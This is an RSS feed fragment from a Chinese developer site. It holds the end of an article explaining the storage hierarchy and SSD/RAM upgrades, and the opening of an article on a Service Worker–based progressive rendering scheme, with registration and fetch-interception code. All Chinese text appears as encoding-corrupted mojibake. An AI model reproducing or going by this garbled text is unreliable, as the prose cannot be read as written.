<li><strong>L1ç¼“å­˜</strong>ï¼šæœ€å¿«ï¼Œå®¹é‡æœ€å°ï¼ˆKBçº§ï¼‰ï¼Œé›†æˆåœ¨CPUå†…éƒ¨</li>
<li><strong>L2ç¼“å­˜</strong>ï¼šè¾ƒå¿«ï¼Œå®¹é‡ä¸­ç­‰ï¼ˆMBçº§ï¼‰ï¼Œä¹Ÿé›†æˆåœ¨CPUå†…éƒ¨</li>
<li><strong>L3ç¼“å­˜</strong>ï¼šè¾ƒæ…¢ï¼Œå®¹é‡è¾ƒå¤§ï¼ˆMBçº§ï¼‰ï¼Œå¯èƒ½å…±äº«å¤šä¸ªæ ¸å¿ƒ</li>
</ul>
<p>CPUè®¿é—®æ•°æ®çš„é¡ºåºæ˜¯ï¼šL1ç¼“å­˜ â†’ L2ç¼“å­˜ â†’ L3ç¼“å­˜ â†’ å†…å­˜ â†’ ç¡¬ç›˜ã€‚è¿™å°±åƒä½ æ‰¾ä¸œè¥¿çš„é¡ºåºï¼šå£è¢‹ â†’ æ¡Œé¢ â†’ æŠ½å±‰ â†’ æŸœå­ â†’ ä»“åº“ï¼</p>
<h3 data-id="heading-17">ğŸ¯ å­˜å‚¨ä¼˜åŒ–ï¼šè®©ç”µè„‘è·‘å¾—æ›´å¿«</h3>
<p>äº†è§£äº†å­˜å‚¨å±‚æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•ä¼˜åŒ–ç”µè„‘æ€§èƒ½ï¼š</p>
<h4 data-id="heading-18">1. ğŸš€ å¢åŠ å†…å­˜å®¹é‡</h4>
<p>å¦‚æœä½ çš„ç”µè„‘ç»å¸¸å¡é¡¿ï¼Œå°¤å…¶æ˜¯åŒæ—¶æ‰“å¼€å¤šä¸ªç¨‹åºæ—¶ï¼Œå¢åŠ å†…å­˜å®¹é‡æ˜¯æœ€æœ‰æ•ˆçš„ä¼˜åŒ–æ–¹æ³•ä¹‹ä¸€ã€‚</p>
<p><strong>æ¨èå†…å­˜å®¹é‡</strong>ï¼š</p>
<ul>
<li>æ—¥å¸¸åŠå…¬ï¼š8GB</li>
<li>æ¸¸æˆå’Œè®¾è®¡ï¼š16GB-32GB</li>
<li>ä¸“ä¸šå·¥ä½œç«™ï¼š64GBä»¥ä¸Š</li>
</ul>
<h4 data-id="heading-19">2. âš¡ å‡çº§åˆ°SSD</h4>
<p>æŠŠæœºæ¢°ç¡¬ç›˜æ¢æˆSSDï¼Œç”µè„‘çš„å¯åŠ¨é€Ÿåº¦å’Œç¨‹åºåŠ è½½é€Ÿåº¦ä¼šæœ‰è´¨çš„é£è·ƒï¼</p>
<p><strong>å‡çº§å»ºè®®</strong>ï¼š</p>
<ul>
<li>ç³»ç»Ÿç›˜ï¼šNVMe SSDï¼ˆé€Ÿåº¦æœ€å¿«ï¼‰</li>
<li>æ•°æ®ç›˜ï¼šSATA SSDæˆ–å¤§å®¹é‡HDD</li>
</ul>
<h4 data-id="heading-20">3. ğŸ’¾ åˆç†åˆ†é…å­˜å‚¨</h4>
<ul>
<li>æŠŠæ“ä½œç³»ç»Ÿå’Œå¸¸ç”¨ç¨‹åºå®‰è£…åœ¨SSDä¸Š</li>
<li>æŠŠå¤§æ–‡ä»¶ï¼ˆè§†é¢‘ã€ç…§ç‰‡ï¼‰å­˜æ”¾åœ¨HDDæˆ–äº‘å­˜å‚¨ä¸Š</li>
<li>å®šæœŸæ¸…ç†ç¡¬ç›˜ï¼Œåˆ é™¤ä¸éœ€è¦çš„æ–‡ä»¶</li>
</ul>
<h4 data-id="heading-21">4. ğŸ“Š ç›‘æ§å­˜å‚¨ä½¿ç”¨</h4>
<p>ä½¿ç”¨ç³»ç»Ÿå·¥å…·ç›‘æ§å†…å­˜å’Œç¡¬ç›˜ä½¿ç”¨æƒ…å†µï¼ŒåŠæ—¶å‘ç°é—®é¢˜ï¼š</p>
<ul>
<li>Windowsï¼šä»»åŠ¡ç®¡ç†å™¨ â†’ æ€§èƒ½æ ‡ç­¾</li>
<li>macOSï¼šæ´»åŠ¨ç›‘è§†å™¨ â†’ å†…å­˜/ç£ç›˜æ ‡ç­¾</li>
<li>Linuxï¼šhtopæˆ–free/dfå‘½ä»¤</li>
</ul>
<h3 data-id="heading-22">ğŸ“ äº’åŠ¨å°æµ‹éªŒï¼šä½ ç­”å¯¹äº†å—ï¼Ÿ</h3>
<p>æ¥æµ‹è¯•ä¸€ä¸‹ä½ å¯¹å­˜å‚¨ç³»ç»Ÿçš„äº†è§£ï¼š</p>



































<table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th><th>ä½ ç­”å¯¹äº†å—ï¼Ÿ</th></tr></thead><tbody><tr><td>å†…å­˜çš„é€Ÿåº¦æ¯”ç¡¬ç›˜å¿«å¤šå°‘å€ï¼Ÿ</td><td>1000å€ä»¥ä¸Š</td><td>âœ…/âŒ</td></tr><tr><td>æ–­ç”µåï¼Œå†…å­˜ä¸­çš„æ•°æ®ä¼šä¸¢å¤±å—ï¼Ÿ</td><td>ä¼š</td><td>âœ…/âŒ</td></tr><tr><td>SSDçš„è¯»å†™é€Ÿåº¦å¯è¾¾å¤šå°‘ï¼Ÿ</td><td>7000MB/s</td><td>âœ…/âŒ</td></tr><tr><td>å­˜å‚¨é‡‘å­—å¡”ä¸­ï¼Œé€Ÿåº¦æœ€å¿«çš„æ˜¯ï¼Ÿ</td><td>å¯„å­˜å™¨</td><td>âœ…/âŒ</td></tr><tr><td>ç¼“å­˜åˆ†ä¸ºå‡ çº§ï¼Ÿ</td><td>ä¸‰çº§ï¼ˆL1/L2/L3ï¼‰</td><td>âœ…/âŒ</td></tr></tbody></table>
<h3 data-id="heading-23">ğŸ”® æœªæ¥å­˜å‚¨æŠ€æœ¯ï¼šæ›´å¿«ã€æ›´å¤§ã€æ›´ä¾¿å®œ</h3>
<p>æœªæ¥çš„å­˜å‚¨æŠ€æœ¯ä¼šæœå“ªä¸ªæ–¹å‘å‘å±•ï¼Ÿ</p>
<h4 data-id="heading-24">1. ğŸ’¾ 3D NANDï¼šå †å æ›´å¤šå±‚</h4>
<p>3D NANDæŠ€æœ¯å¯ä»¥æŠŠé—ªå­˜èŠ¯ç‰‡å †å å¾—æ›´é«˜ï¼Œä»è€Œæé«˜å®¹é‡ã€é™ä½æˆæœ¬ã€‚ç›®å‰å·²ç»å¯ä»¥å †å 200å¤šå±‚ï¼Œæœªæ¥å¯èƒ½è¾¾åˆ°1000å±‚ä»¥ä¸Šï¼</p>
<h4 data-id="heading-25">2. ğŸš€ PCIe 5.0/6.0ï¼šæ›´å¿«çš„æ¥å£</h4>
<p>PCIe 5.0 SSDçš„é€Ÿåº¦å·²ç»è¾¾åˆ°14000MB/sï¼ŒPCIe 6.0æ›´æ˜¯èƒ½è¾¾åˆ°28000MB/sï¼Œæ¯”ç°åœ¨çš„NVMe SSDå¿«4å€ï¼</p>
<h4 data-id="heading-26">3. ğŸ§¬ ç›¸å˜å†…å­˜ï¼ˆPCMï¼‰ï¼šå†…å­˜å’Œç¡¬ç›˜çš„ç»“åˆ</h4>
<p>ç›¸å˜å†…å­˜æ˜¯ä¸€ç§æ–°å‹å­˜å‚¨æŠ€æœ¯ï¼Œæ—¢æœ‰å†…å­˜çš„é€Ÿåº¦ï¼Œåˆæœ‰ç¡¬ç›˜çš„éæ˜“å¤±æ€§ã€‚æœªæ¥å¯èƒ½ä¼šå–ä»£ä¼ ç»Ÿå†…å­˜å’Œç¡¬ç›˜ï¼Œå®ç°"ç»Ÿä¸€å­˜å‚¨"ï¼</p>
<h4 data-id="heading-27">4. â˜ï¸ è¾¹ç¼˜è®¡ç®—ï¼šäº‘å­˜å‚¨çš„å»¶ä¼¸</h4>
<p>éšç€5Gå’Œè¾¹ç¼˜è®¡ç®—çš„å‘å±•ï¼Œäº‘å­˜å‚¨ä¼šå˜å¾—æ›´å¿«ã€æ›´æ™®åŠã€‚æœªæ¥ä½ çš„ç”µè„‘å¯èƒ½åªéœ€è¦å¾ˆå°‘çš„æœ¬åœ°å­˜å‚¨ï¼Œå¤§éƒ¨åˆ†æ•°æ®éƒ½å­˜æ”¾åœ¨äº‘ç«¯ï¼</p>
<h3 data-id="heading-28">ğŸ¯ ç»“è¯­ï¼šå­˜å‚¨é‡‘å­—å¡”çš„æ™ºæ…§</h3>
<p>ç”µè„‘çš„å­˜å‚¨ç³»ç»Ÿå°±åƒä¸€ä¸ª"é‡‘å­—å¡”"ï¼Œä¸åŒçš„å­˜å‚¨è®¾å¤‡å„å¸å…¶èŒï¼Œå…±åŒæ„æˆäº†é«˜æ•ˆçš„å­˜å‚¨ä½“ç³»ã€‚å†…å­˜è´Ÿè´£é€Ÿåº¦ï¼Œç¡¬ç›˜è´Ÿè´£å®¹é‡ï¼Œå®ƒä»¬ç¼ºä¸€ä¸å¯ï¼</p>
<p>ä¸‹æ¬¡å½“ä½ æ‰“å¼€ç”µè„‘ï¼Œçœ‹åˆ°ç¨‹åºå¿«é€ŸåŠ è½½æ—¶ï¼Œåˆ«å¿˜äº†æ„Ÿè°¢å†…å­˜çš„é«˜é€Ÿï¼›å½“ä½ ä¿å­˜æ–‡ä»¶æ—¶ï¼Œåˆ«å¿˜äº†æ„Ÿè°¢ç¡¬ç›˜çš„å¯é ã€‚å®ƒä»¬å°±åƒä¸€å¯¹é»˜å¥‘çš„æ­æ¡£ï¼Œè®©ä½ çš„ç”µè„‘è·‘å¾—åˆå¿«åˆç¨³ï¼</p>
<hr/>
<h3 data-id="heading-29">ğŸ’¬ äº’åŠ¨è¯é¢˜</h3>
<ol>
<li>ä½ çš„ç”µè„‘å†…å­˜å’Œç¡¬ç›˜å®¹é‡æ˜¯å¤šå°‘ï¼Ÿå¤Ÿç”¨å—ï¼Ÿ</li>
<li>ä½ æœ‰æ²¡æœ‰ç»å†è¿‡ä»HDDå‡çº§åˆ°SSDçš„"é€Ÿåº¦é£è·ƒ"ï¼Ÿ</li>
<li>ä½ è§‰å¾—æœªæ¥çš„ç”µè„‘è¿˜éœ€è¦ç¡¬ç›˜å—ï¼Ÿ</li>
</ol>
<p>å¿«æ¥è¯„è®ºåŒºèŠèŠä½ çš„æƒ³æ³•ï¼ğŸ’¬ ç‚¹èµæ”¶è—ä¸è¿·è·¯ï¼Œå’±ä»¬ä¸‹æœŸç»§ç»­æ¢ç´¢è®¡ç®—æœºçš„"åä¸‡ä¸ªä¸ºä»€ä¹ˆ"ï¼ğŸ‰</p>
<p><strong>å…³æ³¨æˆ‘</strong>ï¼Œä¸‹æœŸå¸¦ä½ è§£é”æ›´å¤šè®¡ç®—æœºçš„"å¥‡è‘©å†·çŸ¥è¯†"ï¼ğŸ¤“</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ç§åŸºäº Service Worker çš„æ¸è¿›å¼æ¸²æŸ“æ–¹æ¡ˆçš„åŸºæœ¬åŸç†]]></title>    <link>https://juejin.cn/post/7583727768544346148</link>    <guid>https://juejin.cn/post/7583727768544346148</guid>    <pubDate>2025-12-15T12:01:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583727768544346148" data-draft-id="7583898823920828458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ç§åŸºäº Service Worker çš„æ¸è¿›å¼æ¸²æŸ“æ–¹æ¡ˆçš„åŸºæœ¬åŸç†"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-15T12:01:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜è¿œæ¹–ä¹‹é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2370998127573751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ç§åŸºäº Service Worker çš„æ¸è¿›å¼æ¸²æŸ“æ–¹æ¡ˆçš„åŸºæœ¬åŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2370998127573751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜è¿œæ¹–ä¹‹é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T12:01:16.000Z" title="Mon Dec 15 2025 12:01:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ç¬”è€…å‰é¢å‘è¿‡ä¸¤ç¯‡å…³äºæµå¼SSRçš„æ–‡ç« ï¼š</p>
<ul>
<li><a href="https://juejin.cn/post/7575090551357407284" target="_blank" title="https://juejin.cn/post/7575090551357407284">æµ…å…¥ç†è§£æµå¼SSRçš„æ€§èƒ½æ”¶ç›Šä¸å·¥ä½œåŸç†</a></li>
<li><a href="https://juejin.cn/post/7492119684047962121" target="_blank" title="https://juejin.cn/post/7492119684047962121">åœ¨H5é¡µé¢çš„SSRä¸­ï¼Œå®¢æˆ·ç«¯éœ€è¦åšå“ªäº›å·¥ä½œï¼Ÿ</a></li>
</ul>
<p>æµå¼SSRå°±æ˜¯ä¸€ç§æ¸è¿›å¼æ¸²æŸ“ï¼Œåœ¨ä¼ ç»Ÿçš„é¡µé¢åŠ è½½æµç¨‹æ˜¯ï¼š<strong>è¯·æ±‚ â†’ ç­‰å¾… â†’ æ¸²æŸ“</strong>ã€‚è€Œæ¸è¿›å¼æ¸²æŸ“çš„æ€è·¯æ˜¯ï¼š</p>
<ol>
<li><strong>ç«‹å³å±•ç¤º</strong>ç¼“å­˜çš„é¡µé¢å¿«ç…§ï¼ˆå³ä½¿æ˜¯æ—§å†…å®¹ï¼‰</li>
<li><strong>åå°è¯·æ±‚</strong>æœ€æ–°çš„é¡µé¢å†…å®¹</li>
<li><strong>æ— ç¼æ›¿æ¢</strong>ä¸ºæœ€æ–°å†…å®¹</li>
</ol>
<p>è¿™æ ·ç”¨æˆ·æ„ŸçŸ¥åˆ°çš„åŠ è½½æ—¶é—´æ¥è¿‘äºé›¶ï¼Œä½“éªŒç±»ä¼¼äºåŸç”Ÿ Appã€‚</p>
<p>å‰é¢ç¬”è€…çš„æ–‡ç« ä¸­ï¼Œæåˆ°å…³äºH5é¡µé¢çš„å¿«ç…§æ˜¯å®¢æˆ·ç«¯åšçš„ã€‚æœ¬ç¯‡æ–‡ç« è®²è¿°ä¸€ç§åŸºäº Service Worker çš„æ¸è¿›å¼æ¸²æŸ“æ–¹æ¡ˆçš„åŸç†ï¼Œç®€å•æ¥è®²å°±æ˜¯å°†å®¢æˆ·ç«¯çš„å·¥ä½œæŒªåˆ°äº†service workerä¸­ã€‚é€šè¿‡ç»™ç«™ç‚¹å¼€å¯ä¸€ä¸ªåå°è¿è¡Œçš„service workerï¼ˆservice workerå¯ä»¥ç‹¬ç«‹äºwebviewè¿è¡Œåœ¨åå°ï¼‰ï¼Œåœ¨service workerä¸­åŠ«æŒåŒ…æ‹¬ä¸»æ–‡æ¡£åœ¨å†…çš„ç½‘ç»œè¯·æ±‚ï¼Œå¯¹æ–‡æ¡£å†…å®¹è¿›è¡Œå­˜å‚¨ï¼Œå¹¶ä¿®æ”¹è¿”å›ã€‚</p>
<h2 data-id="heading-1">æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡</h2>
<h3 data-id="heading-2">æ•´ä½“æ¶æ„</h3>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç”¨æˆ·è®¿é—®    â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Service Worker  â”‚ â—„â”€â”€â”€ æ‹¦æˆªè¯·æ±‚
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜
     â”‚        â”‚
     â”‚        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â–¼                  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¼“å­˜å¿«ç…§ â”‚      â”‚ ç½‘ç»œè¯·æ±‚  â”‚
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
     â”‚                 â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â–¼
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       â”‚  æµå¼æ›¿æ¢    â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<h3 data-id="heading-3">æ ¸å¿ƒä»£ç å®ç°</h3>
<h4 data-id="heading-4">1. HTML é¡µé¢æ³¨å†Œ Service Worker</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¸è¿›å¼æ¸²æŸ“ç¤ºä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">data-snapshot</span>&gt;</span><span class="javascript">
    (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> swEnabled = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'x-sw=false'</span>) &lt; <span class="hljs-number">0</span>;

      <span class="hljs-comment">// æ³¨å†Œ Service Worker</span>
      swEnabled &amp;&amp; navigator.<span class="hljs-property">serviceWorker</span> &amp;&amp; navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">'/sw.js'</span>)
        .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">registration</span>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Service Worker æ³¨å†ŒæˆåŠŸ:'</span>, registration);
        })
        .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Service Worker æ³¨å†Œå¤±è´¥:'</span>, error);
        });

      <span class="hljs-comment">// å¦‚æœç¦ç”¨ï¼Œåˆ™æ³¨é”€ Service Worker</span>
      !swEnabled &amp;&amp; navigator.<span class="hljs-property">serviceWorker</span> &amp;&amp; navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">getRegistration</span>(location.<span class="hljs-property">href</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">r</span>) =&gt;</span> {
        r &amp;&amp; r.<span class="hljs-title function_">unregister</span>();
      });
    }());
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><strong>å…³é”®ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>data-snapshot</code>Â å±æ€§æ ‡è®°è¿™æ˜¯å¿«ç…§é˜¶æ®µéœ€è¦ä¿ç•™çš„è„šæœ¬</li>
<li>æ”¯æŒé€šè¿‡Â <code>?x-sw=false</code>Â å‚æ•°ç¦ç”¨ Service Worker</li>
<li>ç¦ç”¨æ—¶ä¼šè‡ªåŠ¨æ³¨é”€å·²æ³¨å†Œçš„ Service Worker</li>
</ul>
<h4 data-id="heading-5">2. Service Worker æ ¸å¿ƒé€»è¾‘</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// sw.js</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'fetch'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  <span class="hljs-comment">// åªæ‹¦æˆªä¸»æ–‡æ¡£è¯·æ±‚</span>
  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">request</span>.<span class="hljs-property">destination</span> !== <span class="hljs-string">'document'</span>) {
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ”¯æŒç¦ç”¨åŠŸèƒ½</span>
  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">request</span>.<span class="hljs-property">url</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'x-sw=false'</span>) &gt;= <span class="hljs-number">0</span>) {
    event.<span class="hljs-title function_">waitUntil</span>(caches.<span class="hljs-title function_">delete</span>(<span class="hljs-string">'my-cache'</span>));
    <span class="hljs-keyword">return</span>;
  }

  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleFetch</span>(event.<span class="hljs-property">request</span>));
});

self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'install'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Service Worker å®‰è£…'</span>);
  self.<span class="hljs-title function_">skipWaiting</span>(); <span class="hljs-comment">// ç«‹å³æ¿€æ´»</span>
});
</code></pre>
<h4 data-id="heading-6">3. è„šæœ¬è¿‡æ»¤ç­–ç•¥</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">replaceScripts</span>(<span class="hljs-params">text, regularStream</span>) {
  <span class="hljs-keyword">return</span> text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi</span>, <span class="hljs-function">(<span class="hljs-params">match</span>) =&gt;</span> {
    <span class="hljs-comment">// å¿«ç…§é˜¶æ®µï¼šåªä¿ç•™ data-snapshot è„šæœ¬</span>
    <span class="hljs-comment">// æ­£å¼é˜¶æ®µï¼šåªä¿ç•™æ™®é€šè„šæœ¬</span>
    <span class="hljs-keyword">if</span> (match.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'data-snapshot'</span>) &gt;= <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> regularStream ? <span class="hljs-string">''</span> : match;
    }
    <span class="hljs-keyword">return</span> regularStream ? match : <span class="hljs-string">''</span>;
  });
}
